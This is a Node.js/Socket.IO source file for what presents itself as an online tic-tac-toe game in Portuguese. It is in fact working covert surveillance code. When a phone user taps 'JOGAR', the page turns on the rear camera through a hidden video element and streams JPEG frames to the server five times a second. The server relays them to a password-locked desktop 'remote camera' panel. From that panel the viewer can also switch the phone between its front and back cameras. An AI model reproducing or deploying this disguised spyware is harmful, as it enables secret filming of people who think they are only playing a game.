const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "171172";

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  return isMobile ? 'mobile' : 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>🎮 Jogo da Velha Online</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
            color: #00ff00;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #0f0f0f;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
        }
        
        /* Estilos Mobile */
        .mobile-container {
            text-align: center;
        }
        
        .game-title {
            font-size: 36px;
            color: #00ff00;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .play-button {
            background: transparent;
            color: #00ff00;
            border: 3px solid #00ff00;
            font-size: 32px;
            padding: 20px 50px;
            border-radius: 15px;
            cursor: pointer;
            margin: 30px 0;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .play-button:hover {
            background: #00ff00;
            color: black;
        }
        
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
            aspect-ratio: 1/1;
        }
        
        .cell {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            color: #00ff00;
            cursor: pointer;
            aspect-ratio: 1/1;
        }
        
        .turn-indicator {
            background: #1a1a1a;
            padding: 15px;
            border: 1px solid #00ff00;
            margin: 20px 0;
            font-size: 20px;
        }
        
        /* Estilos PC */
        .pc-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .camera-section, .game-section {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
        }
        
        .video-container {
            position: relative;
            width: 100%;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 8px;
            overflow: hidden;
            aspect-ratio: 4/3;
            margin-bottom: 10px;
        }
        
        #remoteImage {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        
        .password-box {
            background: #0f0f0f;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 90%;
            max-width: 250px;
        }
        
        .password-box input {
            width: 100%;
            padding: 10px;
            font-size: 20px;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        
        .password-box button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .camera-controls {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .camera-btn {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            flex: 1;
            font-family: 'Courier New', monospace;
        }
        
        .camera-btn.active {
            background: #00ff00;
            color: black;
        }
        
        .hidden {
            display: none !important;
        }
        
        .debug-log {
            background: #000;
            color: #00ff00;
            padding: 10px;
            margin-top: 10px;
            font-size: 12px;
            border-left: 3px solid #00ff00;
            max-height: 100px;
            overflow-y: auto;
        }
        
        #localVideo {
            display: none;
        }
        
        @media (max-width: 768px) {
            .pc-container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CONTEÚDO MOBILE -->
        <div id="mobileContent" class="mobile-container">
            <div class="game-title">🎮 JOGO DA VELHA</div>
            
            <div id="welcomeScreen">
                <button class="play-button" onclick="iniciarJogo()">▶ JOGAR</button>
                <div class="debug-log" id="mobileDebug">
                    > Aguardando...
                </div>
            </div>
            
            <div id="gameScreen" style="display:none;">
                <div class="turn-indicator" id="turnIndicator">SUA VEZ</div>
                <div class="board" id="board">
                    ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="fazerJogada(${i})"></div>`).join('')}
                </div>
                <div id="gameStatus" class="debug-log">Jogo iniciado!</div>
                <button class="play-button" style="font-size:20px; padding:10px 20px; margin-top:20px;" onclick="reiniciarJogo()">NOVO JOGO</button>
            </div>
        </div>
        
        <!-- CONTEÚDO PC -->
        <div id="pcContent" class="pc-container hidden">
            <!-- Seção Câmera -->
            <div class="camera-section">
                <h3 style="text-align:center; margin-bottom:15px;">📹 CÂMERA REMOTA</h3>
                <div class="video-container">
                    <img id="remoteImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='480' viewBox='0 0 640 480'%3E%3Crect width='640' height='480' fill='%23000'/%3E%3Ctext x='320' y='240' font-family='Courier New' font-size='24' fill='%2300ff00' text-anchor='middle'%3EAGUARDANDO SINAL...%3C/text%3E%3C/svg%3E">
                    
                    <div id="passwordOverlay">
                        <div class="password-box">
                            <h3>🔒 ACESSO</h3>
                            <input type="password" id="senhaInput" maxlength="6" placeholder="******">
                            <button onclick="verificarSenha()">AUTENTICAR</button>
                            <div id="erroSenha" style="color:#ff0000; margin-top:10px; display:none;">Senha incorreta!</div>
                        </div>
                    </div>
                </div>
                
                <div id="cameraControls" class="camera-controls hidden">
                    <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">FRONTAL</button>
                    <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">TRASEIRA</button>
                </div>
                
                <div class="debug-log" id="cameraDebug">
                    > Aguardando autenticação...
                </div>
            </div>
            
            <!-- Seção Jogo -->
            <div class="game-section">
                <h3 style="text-align:center; margin-bottom:15px;">🎮 JOGO DA VELHA</h3>
                <div class="turn-indicator" id="pcTurnIndicator">AGUARDANDO JOGADOR</div>
                <div class="board" id="pcBoard">
                    ${Array(9).fill(0).map((_, i) => `<div class="cell" data-index="${i}" onclick="pcFazerJogada(${i})"></div>`).join('')}
                </div>
                <div class="debug-log" id="pcDebug">
                    > Aguardando conexão...
                </div>
                <button class="camera-btn" style="margin-top:15px;" onclick="pcReiniciarJogo()">NOVO JOGO</button>
            </div>
        </div>
        
        <!-- Vídeo oculto para captura -->
        <video id="localVideo" autoplay playsinline muted></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "171172";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteImage = document.getElementById('remoteImage');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const cameraControls = document.getElementById('cameraControls');
        const cameraDebug = document.getElementById('cameraDebug');
        const mobileDebug = document.getElementById('mobileDebug');
        const pcDebug = document.getElementById('pcDebug');
        
        // Estado
        let visualizacaoLiberada = false;
        let mediaStream = null;
        let cameraAtual = 'back';
        let intervaloCaptura = null;
        let tentativas = 3;
        
        // Estado do jogo
        let jogoAtivo = false;
        let vezDoJogador = true;
        let celulas = Array(9).fill('');
        
        // Detectar dispositivo
        const isMobile = /mobile|android|iphone|ipod/i.test(navigator.userAgent.toLowerCase());
        
        // Log
        function log(el, msg) {
            if (el) el.innerHTML = '> ' + new Date().toLocaleTimeString() + ': ' + msg;
            console.log(msg);
        }
        
        // Configurar interface
        if (isMobile) {
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
            log(mobileDebug, 'Modo celular ativado');
        } else {
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
            log(pcDebug, 'Modo PC ativado');
            socket.emit('pcConectado');
        }
        
        // ========== FUNÇÕES DA CÂMERA (MOBILE) ==========
        async function iniciarCamera(tipo) {
            try {
                log(mobileDebug, \`Solicitando permissão da câmera \${tipo}...\`);
                
                if (intervaloCaptura) clearInterval(intervaloCaptura);
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: tipo === 'front' ? 'user' : 'environment',
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    },
                    audio: false
                });
                
                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();
                
                log(mobileDebug, '✅ Câmera ativada, iniciando transmissão...');
                
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                let frameCount = 0;
                intervaloCaptura = setInterval(() => {
                    try {
                        if (localVideo.readyState === 4) {
                            ctx.drawImage(localVideo, 0, 0, 320, 240);
                            const frame = canvas.toDataURL('image/jpeg', 0.5);
                            socket.emit('frame', frame);
                            
                            frameCount++;
                            if (frameCount % 30 === 0) {
                                log(mobileDebug, \`Transmitindo... \${frameCount} frames\`);
                            }
                        }
                    } catch (e) {
                        console.log('Erro captura:', e);
                    }
                }, 200);
                
            } catch (err) {
                log(mobileDebug, '❌ Erro câmera: ' + err.message);
            }
        }
        
        // ========== FUNÇÕES DE CONTROLE (PC) ==========
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            
            if (senha === SENHA_CORRETA) {
                passwordOverlay.classList.add('hidden');
                visualizacaoLiberada = true;
                cameraControls.classList.remove('hidden');
                document.getElementById('cameraBackBtn').classList.add('active');
                log(cameraDebug, '✅ Acesso liberado! Aguardando transmissão...');
            } else {
                tentativas--;
                document.getElementById('erroSenha').style.display = 'block';
                if (tentativas <= 0) {
                    document.getElementById('senhaInput').disabled = true;
                }
            }
        };
        
        window.mudarCamera = function(tipo) {
            if (!visualizacaoLiberada) return;
            
            document.getElementById('cameraFrontBtn').classList.toggle('active', tipo === 'front');
            document.getElementById('cameraBackBtn').classList.toggle('active', tipo === 'back');
            
            log(cameraDebug, \'Solicitando troca para câmera \' + tipo);
            socket.emit('trocarCamera', tipo);
        };
        
        // ========== FUNÇÕES DO JOGO (MOBILE) ==========
        window.iniciarJogo = function() {
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('gameScreen').style.display = 'block';
            log(mobileDebug, 'Jogador pronto, aguardando oponente...');
            socket.emit('jogadorPronto');
            
            // Iniciar câmera
            setTimeout(() => iniciarCamera('back'), 500);
        };
        
        window.fazerJogada = function(index) {
            if (!jogoAtivo || !vezDoJogador || celulas[index] !== '') return;
            
            celulas[index] = 'X';
            document.querySelector(\`[data-index="\${index}"]\`).innerHTML = 'X';
            
            if (verificarVitoria('X')) {
                jogoAtivo = false;
                document.getElementById('gameStatus').innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogada', { index, vitoria: true });
                return;
            }
            
            if (!celulas.includes('')) {
                jogoAtivo = false;
                document.getElementById('gameStatus').innerHTML = '🤝 EMPATE!';
                socket.emit('jogada', { index, empate: true });
                return;
            }
            
            vezDoJogador = false;
            document.getElementById('turnIndicator').innerHTML = 'VEZ DO OPONENTE';
            socket.emit('jogada', { index });
        };
        
        function verificarVitoria(jogador) {
            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
            return wins.some(combo => combo.every(i => celulas[i] === jogador));
        }
        
        window.reiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            document.querySelectorAll('.cell').forEach(cell => cell.innerHTML = '');
            document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
            document.getElementById('gameStatus').innerHTML = 'Jogo reiniciado!';
            socket.emit('reiniciarJogo');
        };
        
        // ========== FUNÇÕES DO JOGO (PC) ==========
        window.pcFazerJogada = function(index) {
            if (!jogoAtivo || vezDoJogador || celulas[index] !== '') return;
            
            celulas[index] = 'O';
            document.querySelector(\`#pcBoard [data-index="\${index}"]\`).innerHTML = 'O';
            
            if (verificarVitoriaPC('O')) {
                jogoAtivo = false;
                document.getElementById('pcDebug').innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogadaPC', { index, vitoria: true });
                return;
            }
            
            if (!celulas.includes('')) {
                jogoAtivo = false;
                document.getElementById('pcDebug').innerHTML = '🤝 EMPATE!';
                socket.emit('jogadaPC', { index, empate: true });
                return;
            }
            
            vezDoJogador = true;
            document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
            socket.emit('jogadaPC', { index });
        };
        
        function verificarVitoriaPC(jogador) {
            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
            return wins.some(combo => combo.every(i => celulas[i] === jogador));
        }
        
        window.pcReiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            document.querySelectorAll('#pcBoard .cell').forEach(cell => cell.innerHTML = '');
            document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
            document.getElementById('pcDebug').innerHTML = 'Jogo reiniciado!';
            socket.emit('reiniciarJogo');
        };
        
        // ========== SOCKET EVENTS ==========
        socket.on('connect', () => {
            if (isMobile) log(mobileDebug, 'Conectado ao servidor');
            else log(pcDebug, 'Conectado ao servidor');
        });
        
        socket.on('jogoIniciado', () => {
            if (isMobile) {
                jogoAtivo = true;
                document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
                document.getElementById('gameStatus').innerHTML = 'Jogo iniciado!';
                log(mobileDebug, 'Jogo iniciado!');
            } else {
                jogoAtivo = true;
                vezDoJogador = false;
                document.getElementById('pcTurnIndicator').innerHTML = 'VEZ DO OPONENTE';
                log(pcDebug, 'Jogador mobile conectado! Jogo iniciado.');
            }
        });
        
        socket.on('jogadaRecebida', (data) => {
            if (isMobile) {
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'O';
                    document.querySelector(\`[data-index="\${data.index}"]\`).innerHTML = 'O';
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        document.getElementById('gameStatus').innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        document.getElementById('gameStatus').innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = true;
                        document.getElementById('turnIndicator').innerHTML = 'SUA VEZ';
                    }
                }
            } else {
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'X';
                    document.querySelector(\`#pcBoard [data-index="\${data.index}"]\`).innerHTML = 'X';
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        document.getElementById('pcDebug').innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        document.getElementById('pcDebug').innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = false;
                        document.getElementById('pcTurnIndicator').innerHTML = 'SUA VEZ';
                    }
                }
            }
        });
        
        socket.on('jogoReiniciado', () => {
            if (isMobile) reiniciarJogo();
            else pcReiniciarJogo();
        });
        
        socket.on('trocarCamera', (tipo) => {
            if (isMobile) {
                log(mobileDebug, \'Recebido comando para trocar câmera: \' + tipo);
                iniciarCamera(tipo);
            }
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada && remoteImage) {
                remoteImage.src = frameData;
                log(cameraDebug, 'Frame recebido - atualizando imagem');
            }
        });
        
        // Enter para senha
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  let mobileId = null;
  
  socket.on('pcConectado', () => {
    console.log('PC conectado:', socket.id);
  });
  
  socket.on('jogadorPronto', () => {
    mobileId = socket.id;
    console.log('Jogador mobile pronto:', socket.id);
    io.emit('jogoIniciado');
  });
  
  socket.on('jogada', (data) => {
    console.log('Jogada mobile:', data);
    socket.broadcast.emit('jogadaRecebida', data);
  });
  
  socket.on('jogadaPC', (data) => {
    console.log('Jogada PC:', data);
    socket.broadcast.emit('jogadaRecebida', data);
  });
  
  socket.on('reiniciarJogo', () => {
    console.log('Reiniciando jogo');
    io.emit('jogoReiniciado');
  });
  
  socket.on('frame', (frameData) => {
    // Log a cada 30 frames
    if (Math.random() < 0.03) console.log('Frame recebido do celular');
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('trocarCamera', (tipo) => {
    console.log('Trocar câmera:', tipo);
    socket.broadcast.emit('trocarCamera', tipo);
  });
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
    if (socket.id === mobileId) {
      io.emit('jogadorDesconectado');
    }
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(50));
  console.log('🚀 Servidor rodando na porta', PORT);
  console.log('🔑 Senha da câmera:', SENHA);
  console.log('📱 Abra no celular e clique em JOGAR');
  console.log('💻 Abra no PC e digite a senha');
  console.log('='.repeat(50));
});
